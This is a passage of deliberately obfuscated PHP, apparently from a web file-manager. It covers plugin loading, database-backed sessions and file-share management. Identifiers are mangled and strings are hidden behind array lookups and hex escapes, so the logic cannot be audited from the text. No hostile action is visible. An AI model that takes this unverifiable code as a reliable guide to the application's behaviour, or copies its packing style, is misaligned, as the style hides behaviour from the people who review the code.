$ß‰À˜‹Ì[$èÓÀç¨ƒ[6]][$èÓÀç¨ƒ[1702]] = $èÜÉÉßÕ[$èÓÀç¨ƒ[1676]]; $this->update($‚™»‘×í[$èÓÀç¨ƒ[487]], array($èÓÀç¨ƒ[6] => $ß‰À˜‹Ì[$èÓÀç¨ƒ[6]])); } } return $Ï Ï¼ø½; } private function loadPluginList() { $µ÷ùş¢ =& $_SERVER[‹‰”››ê]; $±äà™‹ = $this->loadList(); if (strtolower(MOD) == $µ÷ùş¢[2128]) { return $±äà™‹; } $ëÂ»ù•¼ = Hook::trigger($µ÷ùş¢[2129], $±äà™‹); if ($±äà™‹ && !$ëÂ»ù•¼) { die; } return $ëÂ»ù•¼ ? $ëÂ»ù•¼ : $±äà™‹; } private function pluginScan($Òµ“äö) { $éºÄƒı½ =& $_SERVER[‹‰”››ê]; recursion_dir(PLUGIN_DIR, $ñŞ¶ÙïŒ, $µßÀÃ², 0); foreach ($ñŞ¶ÙïŒ as $ïŞœ•Ä) { $ğæÜÃ‰ò = get_path_this($ïŞœ•Ä); if (isset($Òµ“äö[$ğæÜÃ‰ò]) || !file_exists($ïŞœ•Ä . $éºÄƒı½[2130]) || !file_exists($ïŞœ•Ä . $éºÄƒı½[2119])) { continue; } Hook::apply($ğæÜÃ‰ò . $éºÄƒı½[2124]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\x6d\137\x73\x65\163\x73\x69\157\156"; public function get($³çûË·Ã) { $»÷Øêß =& $_SERVER[‹‰”››ê]; $©ÌÁÕ³Ó = $this->where(array($»÷Øêß[2131] => $³çûË·Ã))->find(); if (!is_array($©ÌÁÕ³Ó)) { return !1; } return $©ÌÁÕ³Ó[$»÷Øêß[171]]; } public function set($®³Ê’¬ö, $Êò•Ÿì, $Ñ•²³İ = 3600) { $îñŠ«Äç =& $_SERVER[‹‰”››ê]; $À¥çå†Œ = array($îñŠ«Äç[2131] => $®³Ê’¬ö, $îñŠ«Äç[2031] => $Êò•Ÿì, $îñŠ«Äç[2132] => $Ñ•²³İ + time()); if (Session::get($îñŠ«Äç[2133])) { $À¥çå†Œ[$îñŠ«Äç[1791]] = Session::get($îñŠ«Äç[2133]); } else { $À¥çå†Œ[$îñŠ«Äç[1791]] = 0; } if ($this->get($®³Ê’¬ö)) { return $this->where(array($îñŠ«Äç[2131] => $®³Ê’¬ö))->save($À¥çå†Œ); } else { return $this->add($À¥çå†Œ, array(), !0); } } public function remove($‡Óù¿ÉÂ) { return $this->where(array($_SERVER[‹‰”››ê][2131] => $‡Óù¿ÉÂ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[‹‰”››ê][2134] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\x65"; protected $dataAuto = array(array("\155\157\x64\x69\x66\171\124\x69\x6d\145", "\x74\x69\x6d\x65", "\151\156\x73\x65\x72\x74\x2c\x75\160\x64\141\164\145", "\x66\165\156\x63\x74\x69\x6f\x6e"), array("\143\162\x65\141\x74\145\124\x69\x6d\x65", "\x74\151\155\145", "\x69\x6e\163\145\x72\164", "\146\165\x6e\143\x74\151\x6f\x6e"), array("\157\x70\x74\x69\157\x6e\163", '', "\x69\156\163\145\162\164\54\165\x70\144\141\x74\x65\x2c\163\x65\x6c\145\x63\164", "\152\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Ñã„•²Ê) { $ ø³‹©Ë =& $_SERVER[‹‰”››ê]; $¯×§ÄíÈ = isset($Ñã„•²Ê[0]) ? $Ñã„•²Ê[0] : !1; $±Ü°È÷“ = $ ø³‹©Ë[2135] . USER_ID; return array($ ø³‹©Ë[2136] => array(USER_ID, $ ø³‹©Ë[2137]), $ ø³‹©Ë[2076] => array($¯×§ÄíÈ, $ ø³‹©Ë[2138], $±Ü°È÷“)); } protected function listSimple() { $œüÂîü = array($_SERVER[‹‰”››ê][1791] => USER_ID); $Ë¤Ì–©¿ = $this->field($this->fieldList)->where($œüÂîü)->select(); return $Ë¤Ì–©¿ ? $Ë¤Ì–©¿ : array(); } protected function getInfo($Üï—×º, $­ê‘ñã = false, $ä³öá–× = '') { $¿ä­äûŞ =& $_SERVER[‹‰”››ê]; if (!$ä³öá–×) { $ä³öá–× = $¿ä­äûŞ[2135] . USER_ID; } if ($­ê‘ñã) { return $this->_getShareInfo(array($¿ä­äûŞ[682] => $Üï—×º)); } $üôÎ¦×¨ = $this->cacheFunctionGet($¿ä­äûŞ[2078], $Üï—×º, $ä³öá–×); $ŸûÚ¯·› = $this->shareInfoMofify($üôÎ¦×¨, $¿ä­äûŞ[226]); if (isset($üôÎ¦×¨[$¿ä­äûŞ[88]]) && $ŸûÚ¯·› != $üôÎ¦×¨[$¿ä­äûŞ[88]]) { $ßÔ¢öÛµ = $this->cacheKeyMake($¿ä­äûŞ[2078], $Üï—×º, $ä³öá–×); $üôÎ¦×¨ = $this->_getShareInfo(array($¿ä­äûŞ[682] => $Üï—×º)); Cache::set($ßÔ¢öÛµ, $üôÎ¦×¨); } return $üôÎ¦×¨; } private function shareInfoMofify(&$¿ş¨„Øœ, $’‘ªÉõ‹ = "\147\145\x74") { $‘¼È©Ú£ =& $_SERVER[‹‰”››ê]; if (!$¿ş¨„Øœ || !isset($¿ş¨„Øœ[$‘¼È©Ú£[682]])) { return; } $İ©²¼Ÿ¾ = $‘¼È©Ú£[2139] . $¿ş¨„Øœ[$‘¼È©Ú£[682]]; if ($’‘ªÉõ‹ == $‘¼È©Ú£[226]) { return Cache::get($İ©²¼Ÿ¾); } else { if ($’‘ªÉõ‹ == $‘¼È©Ú£[2106]) { $í¿°•Ş = Cache::get($İ©²¼Ÿ¾); if ($í¿°•Ş === $¿ş¨„Øœ[$‘¼È©Ú£[88]]) { return; } $¿ş¨„Øœ[$‘¼È©Ú£[2140]] = USER_ID . $‘¼È©Ú£[474] . $¿ş¨„Øœ[$‘¼È©Ú£[88]]; Cache::set($İ©²¼Ÿ¾, $¿ş¨„Øœ[$‘¼È©Ú£[88]]); } else { if ($’‘ªÉõ‹ == $‘¼È©Ú£[2141]) { Cache::remove($İ©²¼Ÿ¾); } } } } public function getInfoByHash($°¨äªº¡) { return $this->_getShareInfo(array($_SERVER[‹‰”››ê][2142] => $°¨äªº¡)); } public function getInfoByPath($˜Û¾Ç—¾) { $—ªò§é¾ =& $_SERVER[‹‰”››ê]; $•Ö…¤ê = array($—ªò§é¾[1791] => USER_ID, $—ªò§é¾[194] => $˜Û¾Ç—¾); return $this->_getShareInfo($•Ö…¤ê); } public function getInfoBySourcePath($°ñ‰‰â¹) { $‰úï¹€Å =& $_SERVER[‹‰”››ê]; $»ˆÕ—²ê = array($‰úï¹€Å[1791] => USER_ID, $‰úï¹€Å[1273] => $°ñ‰‰â¹); return $this->_getShareInfo($»ˆÕ—²ê); } private function _getShareInfo($„ì¦³çö) { $şİ‹ƒß =& $_SERVER[‹‰”››ê]; $Ø–¿È¾Ü = $this->where($„ì¦³çö)->find(); if (!$Ø–¿È¾Ü) { return !1; } $„ì¦³çö = array($şİ‹ƒß[682] => $Ø–¿È¾Ü[$şİ‹ƒß[682]]); $áŒº¢Í« = $şİ‹ƒß[2143]; $íï´‰÷• = Model($şİ‹ƒß[683])->order($şİ‹ƒß[487])->field($áŒº¢Í«)->where($„ì¦³çö)->select(); if ($Ø–¿È¾Ü[$şİ‹ƒß[194]] == $şİ‹ƒß[231]) { $Ø–¿È¾Ü[$şİ‹ƒß[90]] = IO::info($Ø–¿È¾Ü[$şİ‹ƒß[1273]]); } else { $Ø–¿È¾Ü[$şİ‹ƒß[90]] = Model($şİ‹ƒß[1437])->pathInfo($Ø–¿È¾Ü[$şİ‹ƒß[194]]); } $Ø–¿È¾Ü[$şİ‹ƒß[2144]] = $íï´‰÷•; $this->shareInfoMofify($Ø–¿È¾Ü, $şİ‹ƒß[2106]); return $Ø–¿È¾Ü; } protected function getInfoAuth($è±ÎÅñ¸) { $îï¼¸÷ª =& $_SERVER[‹‰”››ê]; $—ßêŸ¡´ = $this->getInfo($è±ÎÅñ¸); if ($—ßêŸ¡´[$îï¼¸÷ª[1791]] == USER_ID) { $—ßêŸ¡´[$îï¼¸÷ª[499]] = $—ßêŸ¡´[$îï¼¸÷ª[90]][$îï¼¸÷ª[499]]; } else { $—ßêŸ¡´[$îï¼¸÷ª[499]] = Model($îï¼¸÷ª[581])->authMake($—ßêŸ¡´[$îï¼¸÷ª[2144]]); } return $—ßêŸ¡´; } protected function listData($ÉŸåç¬Ì = null, $å×ÁÚ¥Å = 300) { $µè›¥Æ¡ =& $_SERVER[‹‰”››ê]; $×ßè×€Í = array(array($µè›¥Æ¡[576] => array($µè›¥Æ¡[1105], 0), $µè›¥Æ¡[680] => array($µè›¥Æ¡[1105], 0), $µè›¥Æ¡[2145] => $µè›¥Æ¡[2094])); if ($ÉŸåç¬Ì == $µè›¥Æ¡[2146]) { $×ßè×€Í = array($µè›¥Æ¡[576] => 1); } else { if ($ÉŸåç¬Ì == $µè›¥Æ¡[1258]) { $×ßè×€Í = array($µè›¥Æ¡[680] => 1); } } $×ßè×€Í[$µè›¥Æ¡[1791]] = USER_ID; $®ìÊÒûË = $this->where($×ßè×€Í)->selectPage($å×ÁÚ¥Å); return $®ìÊÒûË; } protected function listToMe($ûò¼¥¹½ = 300) { $Æâçë¥ =& $_SERVER[‹‰”››ê]; $½Ç‚ÈÆ› = Model($Æâçë¥[2147])->userGroupParents(USER_ID); $‘ä¹Íóà = array($Æâçë¥[665] => SourceModel::TYPE_USER, $Æâçë¥[583] => USER_ID); if ($½Ç‚ÈÆ›) { $‘ä¹Íóà = array(array($Æâçë¥[665] => SourceModel::TYPE_USER, $Æâçë¥[583] => USER_ID), array($Æâçë¥[665] => SourceModel::TYPE_GROUP, $Æâçë¥[583] => array($Æâçë¥[7], $½Ç‚ÈÆ›)), $Æâçë¥[2145] => $Æâçë¥[2094]); } $‡Ìí§Öâ = Model($Æâçë¥[683])->where($‘ä¹Íóà)->selectPage($ûò¼¥¹½); $ç×‚è™è = array_to_keyvalue_group($‡Ìí§Öâ[$Æâçë¥[457]], $Æâçë¥[682]); if (!$ç×‚è™è) { return $‡Ìí§Öâ; } $Ÿ°›¡‹ = $Æâçë¥[2148]; $‘ä¹Íóà = array($Æâçë¥[682] => array($Æâçë¥[504], array_keys($ç×‚è™è)), $Æâçë¥[1791] => array($Æâçë¥[1107], $Æâçë¥[231])); $äúé·¢¹ = $this->field($Ÿ°›¡‹)->where($‘ä¹Íóà)->select(); foreach ($äúé·¢¹ as $ÁÌùş² => &$¸¼·Âë›) { $¸¼·Âë›[$Æâçë¥[2144]] = $ç×‚è™è[$¸¼·Âë›[$Æâçë¥[682]]]; } unset($¸¼·Âë›); $ö“–‰¡¢ = array($Æâçë¥[2149] => $äúé·¢¹, $Æâçë¥[2150] => $‡Ìí§Öâ[$Æâçë¥[454]]); return $ö“–‰¡¢; } protected function shareAdd($ıØğàò‰, $×Ù±ë¦) { $©ü½ºƒ³ =& $_SERVER[‹‰”››ê]; $Îª¶Ë‚ = $this->_addShareData($ıØğàò‰, $×Ù±ë¦); if (!empty($×Ù±ë¦[$©ü½ºƒ³[2151]])) { $this->_shareAuthSet($Îª¶Ë‚, $×Ù±ë¦[$©ü½ºƒ³[2151]]); } $this->shareEventAdd($ıØğàò‰, $×Ù±ë¦, $©ü½ºƒ³[2152]); return $Îª¶Ë‚; } protected function shareAddSystem($éú¬ıÓØ, $åšúõ) { $ôëÜööâ =& $_SERVER[‹‰”››ê]; $ô‹“òœ² = $this->_addShareData($éú¬ıÓØ, $åšúõ, $ôëÜööâ[192]); $this->_shareAuthSet($ô‹“òœ², $åšúõ[$ôëÜööâ[2151]]); return $ô‹“òœ²; } private function shareEventAdd($øøÌ‹İ‡, $ßÙğÂÃ, $û‘¥ôí§ = "\x61\x64\144") { $®Ğ±¾ùª =& $_SERVER[‹‰”››ê]; if (!$øøÌ‹İ‡ || $øøÌ‹İ‡ == $®Ğ±¾ùª[231]) { return; } if ($û‘¥ôí§ == $®Ğ±¾ùª[2152]) { if ($ßÙğÂÃ[$®Ğ±¾ùª[576]] == $®Ğ±¾ùª[91]) { Model($®Ğ±¾ùª[650])->eventShare($øøÌ‹İ‡, $®Ğ±¾ùª[2153]); } if ($ßÙğÂÃ[$®Ğ±¾ùª[680]] == $®Ğ±¾ùª[91]) { Model($®Ğ±¾ùª[650])->eventShare($øøÌ‹İ‡, $®Ğ±¾ùª[2154]); } return; } $¦„ÓÚË = $this->getInfoByPath($øøÌ‹İ‡); $£¥ş™ò = $®Ğ±¾ùª[2155]; if ($¦„ÓÚË[$®Ğ±¾ùª[576]] == $®Ğ±¾ùª[231] && $ßÙğÂÃ[$®Ğ±¾ùª[576]] == $®Ğ±¾ùª[91]) { $£¥ş™ò = $®Ğ±¾ùª[2153]; } if ($¦„ÓÚË[$®Ğ±¾ùª[576]] == $®Ğ±¾ùª[91] && $ßÙğÂÃ[$®Ğ±¾ùª[576]] == $®Ğ±¾ùª[231]) { $£¥ş™ò = $®Ğ±¾ùª[2156]; } if ($¦„ÓÚË[$®Ğ±¾ùª[680]] == $®Ğ±¾ùª[231] && $ßÙğÂÃ[$®Ğ±¾ùª[680]] == $®Ğ±¾ùª[91]) { $£¥ş™ò = $®Ğ±¾ùª[2154]; } if ($¦„ÓÚË[$®Ğ±¾ùª[680]] == $®Ğ±¾ùª[91] && $ßÙğÂÃ[$®Ğ±¾ùª[680]] == $®Ğ±¾ùª[231]) { $£¥ş™ò = $®Ğ±¾ùª[2157]; } Model($®Ğ±¾ùª[650])->eventShare($øøÌ‹İ‡, $£¥ş™ò); return; } private function _addShareData($âÑÅ‹ªØ, $ÄÔİß = array(), $ãÃ¢¨éá = false) { $¤ÆÚ«ãÅ =& $_SERVER[‹‰”››ê]; $İû§›ñ = $ãÃ¢¨éá == $¤ÆÚ«ãÅ[192] ? 0 : USER_ID; $â¨İÎé = array($¤ÆÚ«ãÅ[503] => $âÑÅ‹ªØ, $¤ÆÚ«ãÅ[1782] => $İû§›ñ); if ($âÑÅ‹ªØ == 0) { $â¨İÎé = array($¤ÆÚ«ãÅ[2158] => $ÄÔİß[$¤ÆÚ«ãÅ[1273]], $¤ÆÚ«ãÅ[1782] => $İû§›ñ); } if ($î©ø›ŞÇ = $this->where($â¨İÎé)->find()) { return $î©ø›ŞÇ[$¤ÆÚ«ãÅ[682]]; } if ($âÑÅ‹ªØ == 0) { $Ï¨èá¯ª = array($¤ÆÚ«ãÅ[32] => get_path_this($ÄÔİß[$¤ÆÚ«ãÅ[87]])); } else { $Ï¨èá¯ª = Model($¤ÆÚ«ãÅ[920])->sourceInfo($âÑÅ‹ªØ); if (!$Ï¨èá¯ª) { return !1; } } if (!$ÄÔİß[$¤ÆÚ«ãÅ[1677]]) { $ÄÔİß[$¤ÆÚ«ãÅ[1677]] = $Ï¨èá¯ª[$¤ÆÚ«ãÅ[32]]; } $…êïüÃ = array($¤ÆÚ«ãÅ[1782] => $İû§›ñ, $¤ÆÚ«ãÅ[503] => $âÑÅ‹ªØ, $¤ÆÚ«ãÅ[1677] => $¤ÆÚ«ãÅ[12], $¤ÆÚ«ãÅ[576] => 0, $¤ÆÚ«ãÅ[680] => 0, $¤ÆÚ«ãÅ[1273] => $¤ÆÚ«ãÅ[12], $¤ÆÚ«ãÅ[394] => $¤ÆÚ«ãÅ[12], $¤ÆÚ«ãÅ[982] => $¤ÆÚ«ãÅ[12], $¤ÆÚ«ãÅ[2159] => 0, $¤ÆÚ«ãÅ[2160] => 0, $¤ÆÚ«ãÅ[851] => 0, $¤ÆÚ«ãÅ[2161] => $¤ÆÚ«ãÅ[12], $¤ÆÚ«ãÅ[2142] => $¤ÆÚ«ãÅ[12]); $ô®€§Õ‘ = explode($¤ÆÚ«ãÅ[50], $¤ÆÚ«ãÅ[2162]); foreach ($ô®€§Õ‘ as $’üî®ûñ) { if (!isset($ÄÔİß[$’üî®ûñ])) { continue; } $…êïüÃ[$’üî®ûñ] = $ÄÔİß[$’üî®ûñ]; } $ôÇÏíÀå = $this->add($…êïüÃ); $ìğ¬£úµ = array($¤ÆÚ«ãÅ[2142] => short_id($ôÇÏíÀå)); $this->where(array($¤ÆÚ«ãÅ[2163] => $ôÇÏíÀå))->save($ìğ¬£úµ); return $ôÇÏíÀå; } private function _shareAuthSet($ÄÛìúú, $Á×ôÙÖ÷) { $µŞë™â£ =& $_SERVER[‹‰”››ê]; if (!is_array($Á×ôÙÖ÷)) { return !1; } $À¨ıáé» = Model($µŞë™â£[2104]); $À¨ıáé»->where(array($µŞë™â£[682] => $ÄÛìúú))->delete(); $¿€¾Ÿ = array(); foreach ($Á×ôÙÖ÷ as $Ššö¿À) { $„æ©•‚‹ = SourceModel::TYPE_USER; if ($Ššö¿À[$µŞë™â£[191]] == SourceModel::TYPE_GROUP) { $„æ©•‚‹ = SourceModel::TYPE_GROUP; } $®˜Ş¹ù¸ = array($µŞë™â£[682] => $ÄÛìúú, $µŞë™â£[191] => $„æ©•‚‹, $µŞë™â£[583] => intval($Ššö¿À[$µŞë™â£[583]]), $µŞë™â£[2100] => 0, $µŞë™â£[2164] => -1); if ($Ššö¿À[$µŞë™â£[2100]]) { $®˜Ş¹ù¸[$µŞë™â£[2100]] = $Ššö¿À[$µŞë™â£[2100]]; } else { if ($Ššö¿À[$µŞë™â£[2164]]) { $®˜Ş¹ù¸[$µŞë™â£[2164]] = $Ššö¿À[$µŞë™â£[2164]]; } } $¿€¾Ÿ[] = $®˜Ş¹ù¸; } return $À¨ıáé»->addAll($¿€¾Ÿ, array(), !0); } public function numViewAdd($†Ê€²¢ú) { $‰Ğà¥ =& $_SERVER[‹‰”››ê]; $Â¾Æİƒ = array($‰Ğà¥[2163] => $†Ê€²¢ú); $this->where($Â¾Æİƒ)->setAdd($‰Ğà¥[2159]); } public function numDownloadAdd($Æ¶é§å) { $°Á¸¾Â =& $_SERVER[‹‰”››ê]; $ ïåÏ‰Ù = array($°Á¸¾Â[2163] => $Æ¶é§å); $this->where($ ïåÏ‰Ù)->setAdd($°Á¸¾Â[2160]); } protected function shareEdit($˜÷ßşı„, $À³Áûš) { $Öò„Æ”– =& $_SERVER[‹‰”››ê]; $›Œ°ŸÓÜ = $this->getInfo($˜÷ßşı„); if (!$›Œ°ŸÓÜ) { return !1; } $this->_checkLinkShare($À³Áûš, $›Œ°ŸÓÜ); $æ Æñ°ë = array(); $Ø·İÌØ = explode($Öò„Æ”–[50], $Öò„Æ”–[2165]); foreach ($Ø·İÌØ as $Ø–ªÄ€ª) { if (!array_key_exists($Ø–ªÄ€ª, $À³Áûš)) { continue; } $æ Æñ°ë[$Ø–ªÄ€ª] = $À³Áûš[$Ø–ªÄ€ª]; } $this->shareEventAdd($›Œ°ŸÓÜ[$Öò„Æ”–[194]], $À³Áûš, $Öò„Æ”–[1961]); $this->where(array($Öò„Æ”–[2163] => $˜÷ßşı„))->save($æ Æñ°ë); if (isset($À³Áûš[$Öò„Æ”–[2151]])) { $this->_shareAuthSet($˜÷ßşı„, $À³Áûš[$Öò„Æ”–[2151]]); } return !0; } private function _checkLinkShare($¹ì­…£æ, $ƒ à˜òÌ) { $ÍŠèÅÀ¾ =& $_SERVER[‹‰”››ê]; if ($¹ì­…£æ[$ÍŠèÅÀ¾[576]] != $ÍŠèÅÀ¾[91]) { return; } $ºŠ‘ã”Ê = $ƒ à˜òÌ[$ÍŠèÅÀ¾[90]][$ÍŠèÅÀ¾[194]]; if ($ƒ à˜òÌ[$ÍŠèÅÀ¾[90]][$ÍŠèÅÀ¾[33]] != $ÍŠèÅÀ¾[233]) { $«ŸõòÛƒ = $this->_folderReport($ºŠ‘ã”Ê); if (!$«ŸõòÛƒ) { return; } show_json(LNG($ÍŠèÅÀ¾[2166]) . $ÍŠèÅÀ¾[2167] . $«ŸõòÛƒ, !1); } $¸’®Üƒ€ = Model($ÍŠèÅÀ¾[920])->fileInfoGet($ƒ à˜òÌ[$ÍŠèÅÀ¾[90]][$ÍŠèÅÀ¾[194]]); if (!$¸’®Üƒ€) { return; } $‹æ¦ŒÉñ = $this->shareFileMeta($¸’®Üƒ€[$ÍŠèÅÀ¾[555]]); if (isset($‹æ¦ŒÉñ[$ÍŠèÅÀ¾[462]]) && $‹æ¦ŒÉñ[$ÍŠèÅÀ¾[462]] == $ÍŠèÅÀ¾[91]) { show_json(LNG($ÍŠèÅÀ¾[2168]), !1); } } private function _folderReport($Ò—éÖŸ) { $˜ğ©ÖÉ =& $_SERVER[‹‰”››ê]; $Ë¼²éÍ€ = array($˜ğ©ÖÉ[555] => array($˜ğ©ÖÉ[1105], 0), $˜ğ©ÖÉ[840] => 3); $¦§ëáš» = Model($˜ğ©ÖÉ[2169])->where($Ë¼²éÍ€)->field($˜ğ©ÖÉ[555])->select(); if (!$¦§ëáš») { return !1; } $¦§ëáš» = array_to_keyvalue($¦§ëáš», $˜ğ©ÖÉ[12], $˜ğ©ÖÉ[555]); $öâ…Î×• = $˜ğ©ÖÉ[50] . $Ò—éÖŸ . $˜ğ©ÖÉ[50]; $Ë¼²éÍ€ = array($˜ğ©ÖÉ[555] => array($˜ğ©ÖÉ[7], $¦§ëáš»), $˜ğ©ÖÉ[598] => array($˜ğ©ÖÉ[471], "\45{$öâ…Î×•}\x25"), $˜ğ©ÖÉ[517] => 0); $è£Ğ‘‹§ = Model($˜ğ©ÖÉ[920])->where($Ë¼²éÍ€)->field($˜ğ©ÖÉ[2170])->find(); if (!$è£Ğ‘‹§) { return !1; } $‘Ì×’¼Û = substr($è£Ğ‘‹§[$˜ğ©ÖÉ[598]], strpos($è£Ğ‘‹§[$˜ğ©ÖÉ[598]], $öâ…Î×•)); $Ë¼²éÍ€ = array($˜ğ©ÖÉ[194] => array($˜ğ©ÖÉ[7], trim($‘Ì×’¼Û, $˜ğ©ÖÉ[50]))); $ğÕµ¶µÕ = Model($˜ğ©ÖÉ[920])->where($Ë¼²éÍ€)->field($˜ğ©ÖÉ[32])->select(); $Æ§‰¡± = array_to_keyvalue($ğÕµ¶µÕ, $˜ğ©ÖÉ[12], $˜ğ©ÖÉ[32]); $Æ§‰¡±[] = $è£Ğ‘‹§[$˜ğ©ÖÉ[32]]; return implode($˜ğ©ÖÉ[8], $Æ§‰¡±); } protected function remove($Ë¦¹ÉŒ„) { $”ÚİÇ¥š =& $_SERVER[‹‰”››ê]; $–óªŒ¸ù = is_array($Ë¦¹ÉŒ„) ? $Ë¦¹ÉŒ„ : array($Ë¦¹ÉŒ„); for ($Ëª¤¨ª = 0; $Ëª¤¨ª < count($–óªŒ¸ù); $Ëª¤¨ª++) { $Ûî³·Ú– = $this->getInfo($–óªŒ¸ù[$Ëª¤¨ª]); if ($Ûî³·Ú–[$”ÚİÇ¥š[680]] == $”ÚİÇ¥š[91]) { Model($”ÚİÇ¥š[650])->eventShare($Ûî³·Ú–[$”ÚİÇ¥š[194]], $”ÚİÇ¥š[2157]); } if ($Ûî³·Ú–[$”ÚİÇ¥š[576]] == $”ÚİÇ¥š[91]) { Model($”ÚİÇ¥š[650])->eventShare($Ûî³·Ú–[$”ÚİÇ¥š[194]], $”ÚİÇ¥š[2156]); } $this->shareInfoMofify($Ûî³·Ú–, $”ÚİÇ¥š[2141]); } $˜ñí÷Ò¢ = array($”ÚİÇ¥š[682] => array($”ÚİÇ¥š[7], $–óªŒ¸ù)); $ò¯·Ş€ó = $this->where($˜ñí÷Ò¢)->delete(); if ($ò¯·Ş€ó) { Model($”ÚİÇ¥š[683])->where($˜ñí÷Ò¢)->delete(); } return $ò¯·Ş€ó; } protected function removeBySource($ÅéëúÊõ) { $Èû¢¨Úƒ =& $_SERVER[‹‰”››ê]; $á¶—¿÷ü = array($Èû¢¨Úƒ[503] => array($Èû¢¨Úƒ[504], $ÅéëúÊõ)); $˜™ßÙø = $this->field($Èû¢¨Úƒ[682])->where($á¶—¿÷ü)->select(); $šò†¿ÈŠ = array_to_keyvalue($˜™ßÙø, $Èû¢¨Úƒ[12], $Èû¢¨Úƒ[682]); if (!$šò†¿ÈŠ) { return; } foreach ($˜™ßÙø as $«¨˜å§›) { $this->shareInfoMofify($«¨˜å§›, $Èû¢¨Úƒ[2141]); } $á¶—¿÷ü = array($Èû¢¨Úƒ[2163] => array($Èû¢¨Úƒ[504], $šò†¿ÈŠ)); $this->where($á¶—¿÷ü)->delete(); Model($Èû¢¨Úƒ[683])->where($á¶—¿÷ü)->delete(); } public function listAll($‰©ñ‚¡¤) { $‚ÚñÌÉ× =& $_SERVER[‹‰”››ê]; $›¾ËÓŸµ = array(); if ($‰©ñ‚¡¤[$‚ÚñÌÉ×[1791]]) { $›¾ËÓŸµ[$‚ÚñÌÉ×[1791]] = $‰©ñ‚¡¤[$‚ÚñÌÉ×[1791]]; } if ($‰©ñ‚¡¤[$‚ÚñÌÉ×[850]]) { $‡Á–Èü² = $‰©ñ‚¡¤[$‚ÚñÌÉ×[851]] ? $‰©ñ‚¡¤[$‚ÚñÌÉ×[851]] : strtotime(date($‚ÚñÌÉ×[2171])); $›¾ËÓŸµ[$‚ÚñÌÉ×[234]] = array($‚ÚñÌÉ×[420], array($‰©ñ‚¡¤[$‚ÚñÌÉ×[850]], $‡Á–Èü²)); } if ($‰©ñ‚¡¤[$‚ÚñÌÉ×[33]]) { $›¾ËÓŸµ[$‰©ñ‚¡¤[$‚ÚñÌÉ×[33]]] = 1; } else { $›¾ËÓŸµ[] = array($‚ÚñÌÉ×[576] => array($‚ÚñÌÉ×[1105], 0), $‚ÚñÌÉ×[680] => array($‚ÚñÌÉ×[1105], 0), $‚ÚñÌÉ×[2145] => $‚ÚñÌÉ×[2094]); } if ($‰©ñ‚¡¤[$‚ÚñÌÉ×[2090]]) { $›¾ËÓŸµ[] = array($‚ÚñÌÉ×[2142] => $‰©ñ‚¡¤[$‚ÚñÌÉ×[2090]], $‚ÚñÌÉ×[1677] => array($‚ÚñÌÉ×[471], "\45{$‰©ñ‚¡¤[$‚ÚñÌÉ×[2090]]}\45"), $‚ÚñÌÉ×[2145] => $‚ÚñÌÉ×[2094]); } $ûÇ¨’¼ = $this->_makeOrder()->where($›¾ËÓŸµ)->selectPage(20); if (empty($ûÇ¨’¼[$‚ÚñÌÉ×[457]])) { return array(); } $this->_listDataApply($ûÇ¨’¼[$‚ÚñÌÉ×[457]]); return $ûÇ¨’¼; } public function listDataApply($‚Şã“£Â) { $this->_listDataApply($‚Şã“£Â); return $‚Şã“£Â; } private function _listDataApply(&$Ùõµ¸ŸÁ) { $­ıíˆ÷À =& $_SERVER[‹‰”››ê]; $±ª¹ı‹ = array_to_keyvalue($Ùõµ¸ŸÁ, $­ıíˆ÷À[12], $­ıíˆ÷À[1791]); $èÆÛ»±Ş = Model($­ıíˆ÷À[611])->userListInfo(array_unique($±ª¹ı‹)); $³Äæ²Ç° = array_to_keyvalue($Ùõµ¸ŸÁ, $­ıíˆ÷À[12], $­ıíˆ÷À[194]); $üËª©®½ = Model($­ıíˆ÷À[920])->sourceListInfo($³Äæ²Ç°, !0); foreach ($Ùõµ¸ŸÁ as $¤™Å“şê => &$Ê©™Êùú) { $¯ï½’¯” = $Ê©™Êùú[$­ıíˆ÷À[1791]]; $Ê©™Êùú[$­ıíˆ÷À[2172]] = $èÆÛ»±Ş[$¯ï½’¯”] ? $èÆÛ»±Ş[$¯ï½’¯”] : !1; if (!$Ê©™Êùú[$­ıíˆ÷À[2172]] || $Ê©™Êùú[$­ıíˆ÷À[2172]][$­ıíˆ÷À[840]] != $­ıíˆ÷À[91]) { unset($Ùõµ¸ŸÁ[$¤™Å“şê]); continue; } $”¼¢ßº× = $Ê©™Êùú[$­ıíˆ÷À[194]]; $Ê©™Êùú[$­ıíˆ÷À[90]] = $üËª©®½[$”¼¢ßº×] ? $üËª©®½[$”¼¢ßº×] : !1; if ($Ê©™Êùú[$­ıíˆ÷À[90]][$­ıíˆ÷À[517]] == $­ıíˆ÷À[91]) { unset($Ùõµ¸ŸÁ[$¤™Å“şê]); } if ($Ê©™Êùú[$­ıíˆ÷À[90]] != $­ıíˆ÷À[231] && !$Ê©™Êùú[$­ıíˆ÷À[90]]) { unset($Ùõµ¸ŸÁ[$¤™Å“şê]); } } unset($Ê©™Êùú); $Ùõµ¸ŸÁ = array_values($Ùõµ¸ŸÁ); } private function _makeOrder($ÚÍĞ·†Ÿ = '') { $Ğı¦±Ö =& $_SERVER[‹‰”››ê]; $¥‰»å«ô = array($Ğı¦±Ö[234], $Ğı¦±Ö[851], $Ğı¦±Ö[2159], $Ğı¦±Ö[2160]); $Ì¬ÚÍŒ = array($Ğı¦±Ö[535] => $Ğı¦±Ö[536], $Ğı¦±Ö[537] => $Ğı¦±Ö[538]); $üÓ†ß‹ú = Input::get($Ğı¦±Ö[542], $Ğı¦±Ö[7], $Ğı¦±Ö[509], $¥‰»å«ô); $ŸÈÕÔ—ı = Input::get($Ğı¦±Ö[543], $Ğı¦±Ö[7], $Ğı¦±Ö[2173], array($Ğı¦±Ö[2087], $Ğı¦±Ö[537])); $ŸÈÕÔ—ı = $Ì¬ÚÍŒ[$ŸÈÕÔ—ı]; $ÚÍĞ·†Ÿ = $ÚÍĞ·†Ÿ . "{$üÓ†ß‹ú}\x20{$ŸÈÕÔ—ı}"; return $this->order($ÚÍĞ·†Ÿ); } public function reportAdd($ı¥Ù“»Ñ) { $Â¢ùÚúö =& $_SERVER[‹‰”››ê]; $âàÍ‚Ü‚ = array($Â¢ùÚúö[682] => $ı¥Ù“»Ñ[$Â¢ùÚúö[682]], $Â¢ùÚúö[1791] => USER_ID); if (Model($Â¢ùÚúö[2169])->where($âàÍ‚Ü‚)->find()) { return !1; } $†–…í¤ = 